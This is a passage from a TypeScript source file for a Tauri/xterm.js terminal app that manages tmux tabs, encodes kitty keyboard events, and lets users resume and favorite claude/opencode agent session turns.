import "xp.css";
import "@xterm/xterm/css/xterm.css";
import { Terminal, type ILink } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";
import { invoke } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";
import { getCurrentWindow } from "@tauri-apps/api/window";
import { getCurrentWebview } from "@tauri-apps/api/webview";
import { WebviewWindow } from "@tauri-apps/api/webviewWindow";
import {
  PhysicalPosition,
  PhysicalSize,
  LogicalPosition,
  LogicalSize,
} from "@tauri-apps/api/dpi";
import { homeDir } from "@tauri-apps/api/path";
// CSS Anchor Positioning isn't in WebKit yet (Tauri = WKWebView); this shims
// `anchor-name`/`position-anchor`/`anchor()`/`position-area` so tooltips and
// menus can be authored in native CSS. No-ops where the browser supports it.
import anchorPolyfill from "@oddbird/css-anchor-positioning/fn";
import {
  store,
  DEFAULT_CLICK_RULES,
  type ClickRule,
  type ActivitySource,
  type AppState,
  type CapturePerms,
  type CaptureStatus,
  type ConfigView,
  type DirListing,
  type Event,
  type AiMessage,
  type Fav,
  type FsEntry,
  type OpenTab,
  type Skin,
  type SprefaScopeItem,
  type SprefaScopeKind,
  type WorktreeRow,
  type WtAgent,
} from "./state";
import { registerPlugin, injectPanelHtml, buildActivityRail, allPanels, configOptions } from "./plugin";
import { recordVisit, history as navHistory, clearHistory, onHistoryChange } from "./nav";
import {
  TmuxPanelV2,
  WorktreesPanelV2,
  ActivityPanelV2,
  FavoritesPanelV2,
  setTmuxPanel,
  setWorktreesPanel,
  setActivityPanel,
  setFavoritesPanel,
  type TmuxRow,
  type WtTreeRow,
  type ActRow,
  type FavTreeRow,
} from "./tablepanels";
import { renderTable, type SortState } from "./table";
import { fuzzyFilter } from "./fuzzy";
import { wireContextMenu, showContextMenu, type CtxItem } from "./ctxmenu";
import { installKeymap, runMatchingCommand, type Command } from "./keymap";
import { openPalette, isPaletteOpen } from "./palette";
import { GraphicsOverlay, type GraphicsFrame } from "./graphics";
import { CdpView, cdpQuality, setCdpQuality, QUALITY_STEPS, cdpPerf, setCdpPerf } from "./cdp";
import {
  mountReactDock,
  togglePanel,
  isOpen,
  setDockHooks,
  onDockChange,
  addPreviewPanel,
  isPreviewOpen,
  activatePreviewPanel,
  addTermPanel,
  focusTermPanel,
  removeTermPanel,
  setTermTitle,
  customTermTitle,
  moveTermPanel,
  allPanelIds,
  activePanelId,
  activeGroupEl,
  focusPanelById,
  closeActivePanel,
} from "./reactdock";
import { marked } from "marked";
import DOMPurify from "dompurify";
import { codeToHtml } from "shiki";

type Session = {
  name: string;
  windows: number;
  attached: boolean;
  activity: number; // unix seconds of last activity (tmux #{session_activity})
  created: number; // unix seconds the session was created
  paths: string[]; // distinct pane cwds; mapped to worktrees in refreshSessions
  commands: string[]; // distinct foreground process per pane (claude, nvim, zsh…)
};

type Tab = {
  id: string;
  name: string;
  term: Terminal;
  fit: FitAddon;
  el: HTMLElement;
  graphics?: boolean;
  overlay?: GraphicsOverlay;
};

// Device pixels per terminal cell, for the pty's TIOCGWINSZ pixel size. Graphics
// apps (awrit) read ws_xpixel/ws_ypixel to size their framebuffer; without real
// values they render at 0x0. Reads xterm's measured cell box (internal API) and
// scales by devicePixelRatio. Returns camelCase keys; Tauri maps them to the
// command's cell_w/cell_h. Yields {} if unavailable so callers spread harmlessly.
function cellDims(term: Terminal): { cellW: number; cellH: number } | Record<string, never> {
  const cell = (term as any)?._core?._renderService?.dimensions?.css?.cell;
  if (!cell?.width || !cell?.height) return {};
  const dpr = window.devicePixelRatio || 1;
  return { cellW: Math.round(cell.width * dpr), cellH: Math.round(cell.height * dpr) };
}

// Runtime registry of live terminals. These are resources, not serializable app
// state, so they stay out of the store; the active tab *id* lives in the store.
const tabs = new Map<string, Tab>();

// Terminal font chains. Default is Menlo + powerline/Nerd fallbacks (see the
// Terminal ctor for why). "Super XP" swaps in a pixel font, but MS Sans Serif is
// PROPORTIONAL and would shear the terminal grid, so we use Perfect DOS VGA 437
// (a pixel MONOSPACE) instead. That family ships with xp.css (already imported in
// main.ts:1) and is declared @font-face there, so no new font file is needed.
// Menlo stays as the fallback so missing glyphs still render monospaced.
const TERM_FONT_FAMILY_DEFAULT =
  'Menlo, "Hack Nerd Font Mono", "MesloLGS NF", "DejaVu Sans Mono for Powerline", monospace';
const TERM_FONT_FAMILY_PIXEL = '"Perfect DOS VGA 437 Win", Menlo, monospace';
const termFontFamily = (): string =>
  store.get().xpPixel ? TERM_FONT_FAMILY_PIXEL : TERM_FONT_FAMILY_DEFAULT;

// --- kitty keyboard protocol (graphics tabs) -------------------------------
// awrit pushes the full progressive-enhancement flags (CSI > 31 u) on launch and
// then expects every key as a CSI ... u event. xterm.js doesn't speak it, so we
// encode events ourselves for graphics tabs. MVP: text + common named/functional
// keys, modifiers, press/release; standalone modifier keys are skipped.

// Modifier bitfield per spec: 1 + shift(1) + alt(2) + ctrl(4) + super(8).
function kittyMods(e: KeyboardEvent): number {
  return 1 + (e.shiftKey ? 1 : 0) + (e.altKey ? 2 : 0) + (e.ctrlKey ? 4 : 0) + (e.metaKey ? 8 : 0);
}

// CSI encoding for one key event, or null to fall through to xterm.
function kittyKeySeq(e: KeyboardEvent): string | null {
  const CSI = "\x1b[";
  const mods = kittyMods(e);
  const event = e.type === "keyup" ? 3 : e.repeat ? 2 : 1;
  // The modifiers field (with optional :event sub-param), omitted when default.
  const me = mods > 1 || event > 1 ? `;${mods}:${event}` : "";
  const u = (code: number) => `${CSI}${code}${me}u`;
  const tilde = (n: number) => `${CSI}${n}${me}~`;
  const letter = (L: string) => `${CSI}1${me}${L}`;

  switch (e.key) {
    case "Enter": return u(13);
    case "Tab": return u(9);
    case "Backspace": return u(127);
    case "Escape": return u(27);
    case "ArrowUp": return letter("A");
    case "ArrowDown": return letter("B");
    case "ArrowRight": return letter("C");
    case "ArrowLeft": return letter("D");
    case "Home": return letter("H");
    case "End": return letter("F");
    case "PageUp": return tilde(5);
    case "PageDown": return tilde(6);
    case "Insert": return tilde(2);
    case "Delete": return tilde(3);
  }
  const fn = /^F([1-9]|1[0-2])$/.exec(e.key);
  if (fn) {
    const n = +fn[1];
    const lett: Record<number, string> = { 1: "P", 2: "Q", 3: "R", 4: "S" };
    if (lett[n]) return letter(lett[n]);
    const tn: Record<number, number> = { 5: 15, 6: 17, 7: 18, 8: 19, 9: 20, 10: 21, 11: 23, 12: 24 };
    if (tn[n]) return tilde(tn[n]);
  }
  if ([...e.key].length === 1) {
    // Printable: keycode is the unshifted (lowercase) codepoint; associated text
    // (the actually-typed char) goes in the 3rd field on press without ctrl/alt/meta.
    const cp = e.key.codePointAt(0)!;
    const base = e.key.toLowerCase().codePointAt(0)!;
    if (event !== 3 && !e.ctrlKey && !e.altKey && !e.metaKey) {
      return `${CSI}${base};${mods}:${event};${cp}u`;
    }
    return u(base);
  }
  return null;
}

function kittyKeyHandler(e: KeyboardEvent, id: string): boolean {
  // App keybindings still win on graphics tabs (⌘⇧P palette, ⌘w close, …).
  if (e.type === "keydown" && runMatchingCommand(e)) {
    e.stopPropagation();
    return false;
  }
  if (e.type !== "keydown" && e.type !== "keyup") return true;
  // Standalone modifier keys: skip (pages read modifier state off real keys).
  if (e.key === "Shift" || e.key === "Control" || e.key === "Alt" || e.key === "Meta") {
    e.preventDefault();
    return false;
  }
  const seq = kittyKeySeq(e);
  if (!seq) return true;
  e.preventDefault();
  invoke("write_pty", { id, data: seq }).catch(console.error);
  return false;
}

// Open-tab ids in most-recently-focused order (front = newest). Drives the
// "send to" picker's ordering; updated whenever a terminal becomes active.
let tabRecency: string[] = [];
function touchTab(id: string) {
  tabRecency = [id, ...tabRecency.filter((x) => x !== id)];
}

const $ = <T extends HTMLElement>(s: string) => document.querySelector(s) as T;

const sessionId = (name: string) => `s:${name}`;
const activeId = () => store.get().active;
const setActive = (id: string | null) => store.set({ active: id });

// Persisted open-tab list (for reattach after reload). Keyed by tab name.
function recordTab(name: string, command: string | null, cwd: string | null, graphics = false) {
  const cur = store.get().openTabs;
  if (cur.some((t) => t.name === name)) return;
  store.set({ openTabs: [...cur, { name, command, cwd, graphics }] });
}
function forgetTab(id: string) {
  store.set({ openTabs: store.get().openTabs.filter((t) => sessionId(t.name) !== id) });
}

// Browser-like history of which session you went to and when. Logged into the
// unified activity store (source='session'), deduped on consecutive same-tab,
// suppressed during boot replay so restoring tabs doesn't spam the timeline.
let replaying = false;
let lastVisited: string | null = null;
function logTabVisit(name: string) {
  if (replaying || name === lastVisited) return;
  lastVisited = name;
  invoke("activity_log", {
    source: "session",
    kind: "focus",
    title: name,
    text: `went to ${name}`,
  }).catch(() => {});
}

// xterm palettes per skin. XP = classic console; P5 = blood-red on black;
// AC3 = phosphor-green garage readout with an orange cursor.
const THEMES: Record<Skin, { background: string; foreground: string; cursor: string }> = {
  xp: { background: "#000000", foreground: "#c0c0c0", cursor: "#ffffff" },
  p5: { background: "#0a0000", foreground: "#ff2b2b", cursor: "#ff2b2b" },
  ac3: { background: "#050805", foreground: "#b8e08a", cursor: "#ff8c1a" },
};

// Skin cycle order for the toolbar toggle (XP -> P5 -> AC3 -> XP).
const SKIN_CYCLE: Skin[] = ["xp", "p5", "ac3"];
const nextSkin = (s: Skin): Skin =>
  SKIN_CYCLE[(SKIN_CYCLE.indexOf(s) + 1) % SKIN_CYCLE.length];

// Quick-start sessions launch their agent the first time the tmux session is created.
const QUICK_CMD: Record<string, string> = {
  claude: "claude",
  opencode: "opencode",
};

// ---- tab commands (driven by the central keymap) ----
// Visual tab nav walks EVERY panel across ALL panes (dockview order), not just
// the active group, so cmd+1..9 / next / prev cross panes and reach tool panels
// sharing the bar (tmux v2, worktrees v2). Focusing a panel in another group
// activates that group (setActive). Falls back to terminal open-order before the
// dock reports groups. focusPanelById/activePanelId are generic over panel type.
const visualTabIds = () => {
  const ids = allPanelIds();
  return ids.length ? ids : [...tabs.keys()];
};

// Move focus by ±1 through the visible tabs, wrapping around.
function focusTabByOffset(delta: number) {
  const ids = visualTabIds();
  if (ids.length < 2) return;
  const cur = activePanelId() ?? activeId();
  const i = cur ? ids.indexOf(cur) : -1;
  const next = ids[((i < 0 ? 0 : i) + delta + ids.length) % ids.length];
  focusPanelById(next);
}

// Go to the Nth tab (1-based). 9 always jumps to the last, browser-style.
function focusTabN(n: number) {
  const ids = visualTabIds();
  if (!ids.length) return;
  const idx = n >= 9 ? ids.length - 1 : n - 1;
  if (ids[idx]) focusPanelById(ids[idx]);
}

// Close the focused tab (cmd/ctrl+W). Closes dockview's ACTIVE panel, not the
// store.active terminal — those diverge once focus lands on a non-terminal panel
// (tmux v2, …), which made cmd+W close a stale sibling. Terminal teardown +
// closed-tab capture still run via onTermClosed.
function closeActiveTab() {
  closeActivePanel();
}

// Session name behind the active tab id (strips the "s:" prefix), or "".
function activeTabName(): string {
  const id = activeId();
  return id ? id.slice(sessionId("").length) : "";
}

// Transient in-pane toast for one-shot feedback (favorite saved, nothing to
// favorite, …). Mounts top-center INSIDE the active tab's group (not a global
// fixed corner) and slides in; reuses one node, re-parented to whichever pane is
// active so it always shows over the tab the gesture came from.
let toastEl: HTMLElement | null = null;
let toastTimer: number | null = null;
function flashStatus(msg: string) {
  if (!toastEl) {
    toastEl = document.createElement("div");
    toastEl.className = "app-toast";
  }
  const host = activeGroupEl() ?? document.getElementById("dock") ?? document.body;
  if (toastEl.parentElement !== host) host.appendChild(toastEl);
  toastEl.textContent = msg;
  // restart the enter animation even if the node is reused mid-show
  toastEl.classList.remove("on");
  void toastEl.offsetWidth;
  toastEl.classList.add("on");
  if (toastTimer !== null) clearTimeout(toastTimer);
  toastTimer = window.setTimeout(() => toastEl?.classList.remove("on"), 1800);
}

// ---- favorited AI turns (ledger.rs reads, favorites.db persists) ----
// cwd keys the harness session lookup and the claude ledger path; the launch
// command's first token hints the agent (but we don't require it — a folder can
// have a claude/opencode session even if the tab is a plain shell the user ran
// the agent inside).
type ResolvedSession = { editor: "claude" | "opencode"; sessionId: string; cwd: string };

// Resolve harness sessions for a tab by probing BOTH editors' on-disk stores
// (harness_session) across EVERY candidate cwd — claude keys its jsonl dir by the
// launch cwd, but the live tmux pane may have cd'd into a subdir, so paths[0]
// alone misses it. We try each candidate (live pane cwds, then the launch cwd)
// and carry the cwd that resolved, because the ledger read needs it. The launch
// command, when it names an agent, just orders the probe so the declared agent
// wins ties.
async function tabSessions(cwds: string[], command: string | null): Promise<ResolvedSession[]> {
  const bin = (command ?? "").trim().split(/\s+/)[0]?.split("/").pop();
  const order: ("claude" | "opencode")[] =
    bin === "opencode" ? ["opencode", "claude"] : ["claude", "opencode"];
  const out: ResolvedSession[] = [];
  const seen = new Set<string>();
  for (const cwd of cwds) {
    for (const editor of order) {
      const sid = await invoke<string | null>("harness_session", { tool: editor, cwd }).catch(
        () => null,
      );
      const key = sid ? `${editor}:${sid}` : "";
      if (sid && !seen.has(key)) {
        seen.add(key);
        out.push({ editor, sessionId: sid, cwd });
      }
    }
  }
  return out;
}

// Newest agent session in a cwd whose id is NOT already claimed by another tab's
// resume record. Several agents can share a cwd, so "latest in cwd" alone hands
// every same-cwd tab the same id; skipping claimed ids gives each closed tab a
// distinct session to resume. Probes both editors (declared agent first), each
// newest-first, and returns the first unclaimed hit.
async function unclaimedSession(
  meta: { cwd: string; command: string | null },
  claimed: Set<string>,
): Promise<{ editor: "claude" | "opencode"; sessionId: string } | null> {
  const bin = (meta.command ?? "").trim().split(/\s+/)[0]?.split("/").pop();
  const order: ("claude" | "opencode")[] =
    bin === "opencode" ? ["opencode", "claude"] : ["claude", "opencode"];
  for (const editor of order) {
    const ids = await invoke<string[]>("harness_sessions", { tool: editor, cwd: meta.cwd }).catch(
      () => [] as string[],
    );
    for (const sid of ids) if (!claimed.has(sid)) return { editor, sessionId: sid };
  }
  return null;
}

// Per-(editor,session) ledger cache + the per-tab merged turn list the terminal
// right-click matches against. Warmed on tab activation so the context menu can
// stay synchronous.
const ledgerCache = new Map<string, AiMessage[]>();
const tabTurns = new Map<string, AiMessage[]>();
// Where each session's ledger actually lives (the cwd that resolved it), keyed by
// `editor:session_id`. fav_add needs this cwd so a favorite resumes in the right
// folder — paths[0] (tabMetaById) can be a subdir the session wasn't keyed under.
const turnCwd = new Map<string, string>();
async function turnsFor(
  editor: "claude" | "opencode",
  sessionId: string,
  cwd: string,
): Promise<AiMessage[]> {
  const key = `${editor}:${sessionId}`;
  const hit = ledgerCache.get(key);
  if (hit) return hit;
  const msgs = await invoke<AiMessage[]>("read_ai_messages", {
    editor,
    sessionId,
    cwd,
    afterSeq: null,
  }).catch(() => [] as AiMessage[]);
  ledgerCache.set(key, msgs);
  return msgs;
}
// Load (or refresh) the turns behind a terminal tab into tabTurns. Re-reads the
// latest session each call (drops the cache for it) so a live conversation's new
// turns become matchable.
async function warmTurns(id: string) {
  const meta = tabMetaById(id);
  if (!meta) return;
  const sessions = await tabSessions(tabCwds(id), meta.command);
  const all: AiMessage[] = [];
  for (const s of sessions) {
    ledgerCache.delete(`${s.editor}:${s.sessionId}`); // pick up new turns
    turnCwd.set(`${s.editor}:${s.sessionId}`, s.cwd);
    all.push(...(await turnsFor(s.editor, s.sessionId, s.cwd)));
  }
  tabTurns.set(id, all);
}
// The tab's working dir. The recorded launch cwd is often null/HOME (the user
// cd's then runs the agent inside a shell), so prefer the LIVE tmux pane cwd
// (store.sessions[].paths) — that's where claude/opencode actually keyed their
// session — and fall back to the launch cwd.
function tabMetaById(id: string): { cwd: string; command: string | null } | null {
  const t = tabs.get(id);
  if (!t) return null;
  const rec = store.get().openTabs.find((o) => o.name === t.name);
  const live = store.get().sessions.find((s) => s.name === t.name);
  const cwd = live?.paths?.[0] || rec?.cwd || null;
  return cwd ? { cwd, command: rec?.command ?? null } : null;
}
// Every candidate cwd for a tab's session lookup: each live tmux pane cwd, then
// the recorded launch cwd. claude keys its ledger dir by the cwd it was launched
// in, which may be any of these (a pane can cd elsewhere), so we probe them all.
function tabCwds(id: string): string[] {
  const t = tabs.get(id);
  if (!t) return [];
  const rec = store.get().openTabs.find((o) => o.name === t.name);
  const live = store.get().sessions.find((s) => s.name === t.name);
  const cands = [...(live?.paths ?? []), rec?.cwd].filter(Boolean) as string[];
  return [...new Set(cands)];
}

// --- on-screen turn identification (the alt-screen blocks text selection, so we
// read the xterm buffer directly). Each harness marks turn boundaries visually:
// claude prefixes assistant turns with a ⏺ bullet; opencode paints message blocks
// with a non-default background. We find the block under the pointer via those
// signatures, then match its rendered text to a ledger turn. ---
// Turn-boundary glyphs: claude's ⏺ assistant bullet + the › chevron on human
// turns; opencode delimits with a non-default bg run instead.
const TURN_BULLETS = new Set(["⏺", "●", "◉", "⏵", "•", "◆", "›", "❯", "»", "▶", "🭬"]);
let lastCtxY = 0; // viewport Y of the last right-click, for terminal turn-identify

function rowText(line: import("@xterm/xterm").IBufferLine): string {
  return line.translateToString(true);
}
// First visible glyph + whether any cell has a non-default bg (opencode block).
function rowSignature(line: import("@xterm/xterm").IBufferLine, cols: number) {
  let firstGlyph = "";
  let hasBg = false;
  for (let x = 0; x < cols; x++) {
    const cell = line.getCell(x);
    if (!cell) continue;
    if (!hasBg && !cell.isBgDefault()) hasBg = true;
    const ch = cell.getChars();
    if (!firstGlyph && ch && ch.trim()) firstGlyph = ch;
    if (firstGlyph && hasBg) break;
  }
  return { isBullet: TURN_BULLETS.has(firstGlyph), hasBg };
}

// The rendered text block under clientY: bounded by claude bullets if present,
// else by an opencode bg-color run, else a ±pad line window.
function blockTextAt(id: string, clientY: number): string {
  const t = tabs.get(id);
  if (!t) return "";
  const screen = (t.el.querySelector(".xterm-screen") as HTMLElement | null) ?? t.el;
  const rect = screen.getBoundingClientRect();
  const cellH = rect.height / t.term.rows || 1;
  let vr = Math.floor((clientY - rect.top) / cellH);
  vr = Math.max(0, Math.min(t.term.rows - 1, vr));
  const buf = t.term.buffer.active;
  const top = buf.viewportY;
  const rows: { text: string; isBullet: boolean; hasBg: boolean }[] = [];
  for (let r = 0; r < t.term.rows; r++) {
    const line = buf.getLine(top + r);
    if (!line) {
      rows.push({ text: "", isBullet: false, hasBg: false });
      continue;
    }
    const sig = rowSignature(line, t.term.cols);
    rows.push({ text: rowText(line), isBullet: sig.isBullet, hasBg: sig.hasBg });
  }
  const hasBullets = rows.some((r) => r.isBullet);
  let lo = vr;
  let hi = vr;
  if (hasBullets) {
    while (lo > 0 && !rows[lo].isBullet) lo--;
    while (hi < rows.length - 1 && !rows[hi + 1].isBullet) hi++;
  } else if (rows[vr].hasBg) {
    while (lo > 0 && rows[lo - 1].hasBg) lo--;
    while (hi < rows.length - 1 && rows[hi + 1].hasBg) hi++;
  } else {
    lo = Math.max(0, vr - 4);
    hi = Math.min(rows.length - 1, vr + 4);
  }
  return rows
    .slice(lo, hi + 1)
    .map((r) => r.text)
    .join("\n")
    .trim();
}

// The whitespace-delimited token under a pointer cell, for ⌘-click open. Maps
// clientX/Y → buffer cell, reads that row's text, expands around the column over
// non-space chars, then trims wrapping brackets/quotes + trailing sentence
// punctuation (keeping a `:line:col` suffix, whose digits aren't stripped).
// Cheap front gate so a ⌘-click on a plain word does nothing (no window hide):
// a URL scheme, a www. host, or a token bearing a slash/dot/tilde path marker.
function looksOpenable(tok: string): boolean {
  return /:\/\//.test(tok) || /^www\./.test(tok) || /[/~]/.test(tok) || /\.[a-z0-9]/i.test(tok);
}

const normText = (s: string) => s.toLowerCase().replace(/\s+/g, " ").trim();

// The search query for a right-click: the live selection if there is one, else
// the rendered block under the pointer (surrounding lines, signature-bounded).
function ledgerQuery(id: string, clientY: number): string {
  const sel = tabs.get(id)?.term.getSelection()?.trim();
  if (sel && sel.length >= 3) return sel;
  return blockTextAt(id, clientY);
}

// Fuzzy match the rendered terminal block against the tab's ledger turns. The
// screen text carries words the ledger never had (box-drawing, markdown, tool
// chrome, line-wrap fragments), so a strict ALL-words AND over-rejects — claude
// almost never matched. Instead: tokenize on non-alphanumerics (drops the
// chrome), keep distinct words ≥3 chars, and keep a turn that contains a MAJORITY
// (≥60%, min 2) of them. Ranked: exact contiguous phrase, then coverage ratio,
// then recency.
function searchTurns(turns: AiMessage[], query: string, limit = 6): AiMessage[] {
  const words = [...new Set(query.toLowerCase().split(/[^a-z0-9]+/).filter((w) => w.length >= 3))];
  if (!words.length) return [];
  const nq = normText(query);
  const need = Math.min(words.length, Math.max(2, Math.ceil(words.length * 0.6)));
  const scored: { t: AiMessage; score: number }[] = [];
  for (const t of turns) {
    const text = normText(t.text);
    let hit = 0;
    for (const w of words) if (text.includes(w)) hit++;
    if (hit < need) continue;
    scored.push({ t, score: (text.includes(nq) ? 1000 : 0) + hit / words.length });
  }
  scored.sort((a, b) => b.score - a.score || b.t.seq - a.t.seq);
  return scored.slice(0, limit).map((s) => s.t);
}

const relTime = (ts: number): string => {
  if (!ts) return "";
  const m = Math.floor((Date.now() - ts) / 60000);
  if (m < 1) return "just now";
  if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60);
  return h < 24 ? `${h}h ago` : `${Math.floor(h / 24)}d ago`;
};

// Is this turn already in favorites? (identity = editor + session + message id)
function isTurnFav(turn: AiMessage): boolean {
  return store.get().aiFavs.some(
    (f) =>
      f.editor === turn.editor &&
      f.session_id === turn.session_id &&
      f.message_id === turn.id,
  );
}

// Snapshot one identified turn into favorites.db. No navigation — the toast
// confirms and the ★ rail badge ticks up; open the panel yourself when you want.
async function favoriteTurn(turn: AiMessage, cwd: string) {
  const favs = await invoke<Fav[]>("fav_add", { msg: turn, cwd }).catch((e) => {
    console.error("fav_add", e);
    return null;
  });
  if (favs) {
    store.set({ aiFavs: favs });
    flashStatus(`★ favorited ${turn.role} turn`);
  }
}

async function unfavoriteTurn(turn: AiMessage) {
  const favs = await invoke<Fav[]>("fav_remove", {
    editor: turn.editor,
    sessionId: turn.session_id,
    messageId: turn.id,
  }).catch((e) => {
    console.error("fav_remove", e);
    return null;
  });
  if (favs) {
    store.set({ aiFavs: favs });
    flashStatus("unfavorited turn");
  }
}

// "locate" a favorite: open the saved turn's full text in a split-right preview
// tab (keyed by the turn identity). We already hold the text, so this works for
// both editors and never reads the (multi-MB) jsonl. The locator line shows the
// on-disk address (claude path#line / opencode msg id).
function locateFav(f: Fav) {
  const key = `fav:${f.editor}:${f.session_id}:${f.message_id}`;
  let inst = previewInsts.get(key);
  if (!inst) {
    const el = document.createElement("div");
    el.className = "fs-preview";
    inst = { el };
    previewInsts.set(key, inst);
  }
  const title = `★ ${f.editor} · ${f.role}`;
  inst.el.innerHTML =
    `<div class="fs-preview-meta">${escapeHtml(title)}<br><span>${escapeHtml(f.locator)}</span></div>` +
    `<pre class="code-plain">${escapeHtml(f.text)}</pre>`;
  addPreviewPanel(key, title, inst.el, "right");
}

// cmd+shift+s: favorite the active tab's latest turn (no pointer needed). Probes
// the cwd for a session, so it works even when the tab is a plain shell.
async function favoriteCurrentTurn() {
  const id = activeId();
  const meta = id ? tabMetaById(id) : null;
  if (!id || !meta) {
    flashStatus("no folder for this tab");
    return;
  }
  const sessions = await tabSessions(tabCwds(id), meta.command);
  if (!sessions.length) {
    flashStatus("no AI session for this folder");
    return;
  }
  const s = sessions[0];
  const msg = await invoke<AiMessage | null>("latest_ai_message", {
    editor: s.editor,
    sessionId: s.sessionId,
    cwd: s.cwd,
  }).catch(() => null);
  if (!msg) {
    flashStatus("no turn found yet");
    return;
  }
  await favoriteTurn(msg, s.cwd);
}

// Group favorited turns by their on-disk session (editor + session_id) into a
// foldable tree: one parent session row per conversation, its starred turns as
// children. "I favorite many in 1" -> the session row counts them and is
// "starred at" the most recent. Sessions sort by latest star; turns within a
// session by seq (conversation order).
function favTreeRows(): FavTreeRow[] {
  const groups = new Map<string, Fav[]>();
  for (const f of store.get().aiFavs) {
    const k = `${f.editor}:${f.session_id}`;
    const g = groups.get(k);
    if (g) g.push(f);
    else groups.set(k, [f]);
  }
  const rows: FavTreeRow[] = [];
  for (const [k, list] of groups) {
    const head = list[0];
    const cwd = head.cwd;
    const starredAt = Math.max(...list.map((t) => t.created));
    const turns = [...list].sort((a, b) => a.seq - b.seq);
    rows.push({
      id: `favsess:${k}`,
      kind: "session",
      editor: head.editor,
      label: cwd ? baseName(cwd) : head.session_id.slice(0, 8),
      starredAt,
      sessionId: head.session_id,
      cwd,
      count: list.length,
      live: cwd ? sessionsForWorktree(cwd).length > 0 : false,
      children: turns.map((f) => ({
        id: `fav:${f.editor}:${f.session_id}:${f.message_id}`,
        kind: "turn" as const,
        editor: f.editor,
        label: f.role,
        starredAt: f.created,
        role: f.role,
        preview: f.preview,
        fav: f,
      })),
    });
  }
  rows.sort((a, b) => b.starredAt - a.starredAt);
  return rows;
}

// Resume a favorited on-disk session: open a tmux session in its cwd running the
// harness' resume command (claude --resume <id> / opencode --session <id>). A
// live session in that cwd is reattached by openWorktree; otherwise the agent
// relaunches against the saved conversation id.
function resumeFavSession(r: FavTreeRow) {
  if (r.kind !== "session" || !r.cwd || !r.sessionId) return;
  openWorktree(r.cwd, "", r.cwd, resumeLaunch(r.editor, r.sessionId), true);
}

function registerFavoritesBridge() {
  setFavoritesPanel({
    rows: favTreeRows,
    onShow: () => refreshFavorites(),
    expanded: () => Object.fromEntries(store.get().favExpanded.map((k) => [k, true])),
    setExpanded: (e) => {
      const keys = e === true ? [] : Object.keys(e).filter((k) => (e as Record<string, boolean>)[k]);
      store.set({ favExpanded: keys });
    },
    resume: (r) => resumeFavSession(r),
    copy: (f) => {
      navigator.clipboard.writeText(f.text).catch(() => {});
      flashStatus("turn copied");
    },
    locate: (f) => locateFav(f),
    remove: (f) =>
      invoke<Fav[]>("fav_remove", {
        editor: f.editor,
        sessionId: f.session_id,
        messageId: f.message_id,
      })
        .then((favs) => store.set({ aiFavs: favs }))
        .catch((e) => console.error("fav_remove", e)),
  });
}

function refreshFavorites() {
  invoke<Fav[]>("fav_list")
    .then((favs) => store.set({ aiFavs: favs }))
    .catch(() => {});
}

// Passive count badge on the ★ favorites rail button, so a saved turn registers
// in the UI without navigating there. Subscribed to aiFavs.
function updateFavBadge() {
  const btn = document.getElementById("favorites-toggle");
  if (!btn) return;
  let badge = btn.querySelector(".rail-badge") as HTMLElement | null;
  const n = store.get().aiFavs.length;
  if (!n) {
    badge?.remove();
    return;
  }
  if (!badge) {
    badge = document.createElement("span");
    badge.className = "rail-badge";
    btn.appendChild(badge);
  }
  badge.textContent = n > 99 ? "99+" : String(n);
}

// ---- pinned terminal tabs (persisted by session name) ----
// Visual is a 📌 prefix on the dockview tab title, pushed via reactdock's
// setTermTitle (a public API) so we don't have to touch reactdock's renderer.
const isPinnedTab = (name: string) => store.get().pinnedTabs.includes(name);
// Base = the durable rename override (store.tabTitles) if set, else the session
// name; the pin prefix rides on top so pin + rename compose.
const tabTitle = (name: string) => {
  const base = customTermTitle(sessionId(name)) ?? name;
  return isPinnedTab(name) ? `📌 ${base}` : base;
};
function applyTabTitle(name: string) {
  setTermTitle(sessionId(name), tabTitle(name));
}
function togglePinTab(name: string) {
  if (!name) return;
  const cur = store.get().pinnedTabs;
  store.set({
    pinnedTabs: cur.includes(name)
      ? cur.filter((n) => n !== name)
      : [...cur, name],
  });
  applyTabTitle(name);
  reflowPinnedTabs();
}
// Stack of recently closed tabs for reopen (⌘⇧T). In-memory only. A tmux session
// survives a tab close, so reopen reattaches by name and the agent is still
// alive; the stored command/cwd only matter if the session was actually killed.
const closedTabs: OpenTab[] = [];
// Runs close-time agent teardown one-at-a-time; see onTermClosed for why.
let closeChain: Promise<unknown> = Promise.resolve();
// Await all in-flight close teardown (kill_session / close_pty). Reopen paths
// call this BEFORE recreating a session name so a recreated session can't be
// reattached to a dying corpse or torn down by a kill still queued from its close.
const settleClosures = () => closeChain;
async function reopenLastTab() {
  const last = closedTabs.pop();
  if (!last) return;
  // ⌘⇧T is the "bring back what I just closed" gesture — so if we exited an agent
  // in this SESSION NAME, resume its conversation (name-keyed record) instead of
  // replaying the stale original command. The record is kept (not consumed) so the
  // name->id identity is stable across repeated reopens; "new · X" overwrites it.
  const killed = store.get().resumeTabs[last.name];
  let command = last.command;
  if (killed) {
    command = resumeLaunch(killed.editor, killed.sessionId);
    console.log("[resume] ⌘⇧T", last.name, "->", command);
  }
  // Wait for the close's teardown to finish before recreating this name. The
  // close runs exitOrDetachTab on closeChain (async kill_session / close_pty); if
  // we recreate first, either tmux -A reattaches the dying corpse (dropping the
  // --resume command) or the still-queued kill lands AFTER our new session and
  // tears IT down — the "double reopen" failure. Awaiting frees the name first.
  await settleClosures();
  openTab(last.name, { command, cwd: last.cwd });
}

// Float pinned tabs to the left of the bar, in pinnedTabs order. Each open
// pinned tab is moved to its slot (0,1,2,…); processing in order lets earlier
// pins settle first so the final left-to-right matches the list.
function reflowPinnedTabs() {
  let i = 0;
  for (const name of store.get().pinnedTabs) {
    if (tabs.has(sessionId(name))) moveTermPanel(sessionId(name), i++);
  }
}

// Open a new tmux session at the active tab's cwd (cmd/ctrl+T). The session is
// named after that directory; falls back to a plain "shell" at HOME when there's
// no active terminal to read a cwd from.
function openTabAtPwd() {
  const name = activeTabName();
  const sess = name ? store.get().sessions.find((s) => s.name === name) : undefined;
  const cwd = (sess?.paths ?? [])[0] ?? null;
  const taken = new Set<string>([
    ...store.get().sessions.map((s) => s.name),
    ...[...tabs.values()].map((t) => t.name),
  ]);
  const base = cwd ? tmuxName(baseName(cwd)) : "shell";
  let fresh = base;
  let n = 2;
  while (taken.has(fresh)) fresh = `${base}-${n++}`;
  openTab(fresh, { cwd });
  refreshSessions();
}

// ---- webview zoom (chrome: rail + toolbars + non-terminal panels) ----
const ZOOM_MIN = 0.5;
const ZOOM_MAX = 2.0;
const ZOOM_STEP = 0.1;
function applyZoom() {
